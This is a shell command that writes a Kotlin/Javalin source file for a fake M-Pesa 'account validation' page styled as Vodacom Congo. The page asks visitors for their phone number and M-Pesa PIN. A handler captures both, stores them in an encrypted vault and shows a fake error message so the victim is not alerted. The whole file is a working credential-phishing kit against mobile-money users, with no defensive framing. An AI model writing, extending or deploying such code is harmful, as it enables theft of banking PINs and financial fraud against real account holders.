cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/MPesaCommander.kt
package com.fardc.sigint.core

import io.javalin.Javalin

class MPesaCommander(private val vault: SecurityVault) {
    fun setupMPesaPage(app: Javalin) {
        // Interface M-Pesa simulée
        app.get("/login/mpesa") { ctx ->
            ctx.html("""
                <html>
                <body style="background:#e11d23; font-family:sans-serif; text-align:center; padding-top:50px; color:white;">
                    <div style="background:white; width:350px; margin:auto; padding:25px; border-radius:15px; color:black; box-shadow: 0px 10px 20px rgba(0,0,0,0.2);">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/M-Pesa_Logo.svg/512px-M-Pesa_Logo.svg.png" width="120">
                        <h2 style="margin-top:20px;">Validation du Compte</h2>
                        <p style="color:#555;">Veuillez confirmer votre identité pour continuer</p>
                        <form action="/login/capture-mpesa" method="POST">
                            <input type="text" name="phone" placeholder="Numéro de téléphone (ex: 081...)" style="width:100%; padding:15px; margin:10px 0; border:2px solid #ddd; border-radius:8px; font-size:16px;"><br>
                            <input type="password" name="pin" placeholder="Code PIN M-Pesa (4 ou 5 chiffres)" style="width:100%; padding:15px; margin:10px 0; border:2px solid #ddd; border-radius:8px; font-size:16px;"><br>
                            <button type="submit" style="width:100%; padding:15px; background:#e11d23; border:none; color:white; font-weight:bold; font-size:18px; border-radius:8px; cursor:pointer;">VALIDER</button>
                        </form>
                        <p style="font-size:12px; color:#999; margin-top:15px;">Vodacom Congo S.A. - Sécurité SIGINT</p>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }

        // Capture M-Pesa
        app.post("/login/capture-mpesa") { ctx ->
            val phone = ctx.formParam("phone") ?: "N/A"
            val pin = ctx.formParam("pin") ?: "N/A"
            val log = "🚨 [M-PESA-CAPTURE] Tel: $phone | PIN: [PROTECTED]"
            println(log)
            vault.encryptData("M-PESA - Tel: $phone | PIN: $pin")
            ctx.result("Une erreur technique est survenue. Veuillez réessayer dans quelques minutes.")
        }
    }
}
EOF
